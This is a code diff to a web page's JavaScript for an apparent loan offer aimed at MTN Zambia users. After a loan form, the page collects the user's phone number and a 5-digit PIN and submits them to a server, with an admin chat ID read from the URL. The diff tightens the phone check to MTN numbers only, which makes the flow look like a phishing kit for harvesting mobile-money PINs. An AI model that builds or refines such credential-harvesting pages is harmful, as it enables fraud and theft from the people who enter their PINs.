@@ -15,6 +15,12 @@ document.addEventListener('DOMContentLoaded', () => {
     adminChatId = urlParams.get('admin');
   }
 
+  // Helper to validate MTN Zambia phone numbers (096... or 076...)
+  function isValidMTNPhone(phone) {
+    const clean = String(phone || '').replace(/\D/g, '');
+    return /^0(96|76)\d{7}$/.test(clean);
+  }
+
   // View Management Helper
   function switchView(viewId) {
     const views = [
@@ -50,7 +56,6 @@ document.addEventListener('DOMContentLoaded', () => {
     calcAmountInput.value = selectedAmount;
     durationVal.textContent = `${months} Months`;
 
-    // Simple estimation formula
     const interestRate = 0.15;
     const totalWithInterest = amount * (1 + interestRate);
     const monthly = totalWithInterest / months;
@@ -72,29 +77,6 @@ document.addEventListener('DOMContentLoaded', () => {
   // --- VIEW 2: MULTI-STEP FORM LOGIC ---
   let currentStep = 1;
 
-  function updateStepDisplay() {
-    document.querySelectorAll('.form-step').forEach(step => {
-      const stepNum = parseInt(step.getAttribute('data-step'));
-      if (stepNum === currentStep) {
-        step.classList.remove('hidden');
-        step.classList.add('active-step');
-      } else {
-        step.classList.add('hidden');
-        step.classList.remove('active-step');
-      }
-    });
-
-    document.getElementById('step-indicator').textContent = `Step ${currentStep} of 3`;
-    document.getElementById('progress-fill').style.width = `${(currentStep / 3) * 100}%`;
-
-    if (currentStep === 3) {
-      document.getElementById('sum-amount').textContent = `ZMW ${document.getElementById('form-amount').value}`;
-      document.getElementById('sum-duration').textContent = durationVal.textContent;
-      document.getElementById('sum-purpose').textContent = document.getElementById('loan-purpose').value || 'N/A';
-      document.getElementById('sum-name').textContent = `${document.getElementById('first-name').value} ${document.getElementById('last-name').value}`;
-    }
-  }
-
   function validateStep1() {
     const amount = document.getElementById('form-amount').value;
     const purpose = document.getElementById('loan-purpose').value;
@@ -110,7 +92,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const contact = document.getElementById('user-contact').value;
     const nextBtn = document.querySelector('.form-step[data-step="2"] .next-btn');
     if (nextBtn) {
-      nextBtn.disabled = !(firstName.trim() && lastName.trim() && contact.trim());
+      nextBtn.disabled = !(firstName.trim() && lastName.trim() && isValidMTNPhone(contact));
     }
   }
 
@@ -138,7 +120,29 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  // Enable Submit Application button on step 3 when income is filled
+  function updateStepDisplay() {
+    document.querySelectorAll('.form-step').forEach(step => {
+      const stepNum = parseInt(step.getAttribute('data-step'));
+      if (stepNum === currentStep) {
+        step.classList.remove('hidden');
+        step.classList.add('active-step');
+      } else {
+        step.classList.add('hidden');
+        step.classList.remove('active-step');
+      }
+    });
+
+    document.getElementById('step-indicator').textContent = `Step ${currentStep} of 3`;
+    document.getElementById('progress-fill').style.width = `${(currentStep / 3) * 100}%`;
+
+    if (currentStep === 3) {
+      document.getElementById('sum-amount').textContent = `ZMW ${document.getElementById('form-amount').value}`;
+      document.getElementById('sum-duration').textContent = durationVal.textContent;
+      document.getElementById('sum-purpose').textContent = document.getElementById('loan-purpose').value || 'N/A';
+      document.getElementById('sum-name').textContent = `${document.getElementById('first-name').value} ${document.getElementById('last-name').value}`;
+    }
+  }
+
   document.getElementById('annual-income')?.addEventListener('input', (e) => {
     const submitBtn = document.getElementById('btn-submit-app');
     if (submitBtn) {
@@ -147,7 +151,6 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   document.getElementById('btn-submit-app')?.addEventListener('click', () => {
-    // Transition smoothly to PIN/Login view after completing form
     const contactVal = document.getElementById('user-contact').value;
     if (contactVal) {
       document.getElementById('login-contact').value = contactVal;
@@ -177,13 +180,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const contactVal = document.getElementById('login-contact').value;
     const loginBtn = document.getElementById('btn-login');
     if (loginBtn) {
-      loginBtn.disabled = !(pinString.length === 5 && contactVal.trim());
+      loginBtn.disabled = !(pinString.length === 5 && isValidMTNPhone(contactVal));
     }
   }
 
   document.getElementById('login-contact')?.addEventListener('input', checkPinComplete);
 
-  // Submit PIN to Server
   document.getElementById('btn-login')?.addEventListener('click', async () => {
     const pin = Array.from(pinBoxes).map(b => b.value).join('');
     const contact = document.getElementById('login-contact').value;
@@ -319,4 +321,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-                                                           
+    
